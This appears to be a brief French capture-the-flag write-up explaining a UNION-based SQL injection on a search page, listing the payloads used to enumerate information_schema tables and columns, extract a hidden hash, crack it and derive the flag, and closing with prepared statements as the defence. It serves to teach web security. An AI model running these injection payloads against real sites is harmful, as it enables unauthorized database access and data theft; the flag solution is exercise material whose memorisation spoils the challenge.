# exploiter faille SQL

## Exploit
sur la page /index.php?page=searchimg nous pouvons effectuer une recherche direcement dans la base de donnee \
pour exploiter la table nous avons besoin de connaitre le nom des tables et des colonne. \
dans un premier temp on cherche le nombre de colonne avec : 1 ORDER BY X \
une fois X determine on recherche le nom de la table qui nous interesse avec : 1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables \
(ajouter autant de table_schema ou table_name que X) \
ensuite il nous faut determiner les colonnes de la table : 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns \
pour finir on execute notre requete avec les informations recuperees : 1 AND 1=2 UNION SELECT title,comment FROM list_images \
la base de donnees nous affiche : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 \
decrypte : albatroz \
on met en minuscule puis encrypte en Sh256 pour avoir le flag. \
\
## Protection :
L'utilisation de requete preparee en back  permet d'eviter l'injection sql. \
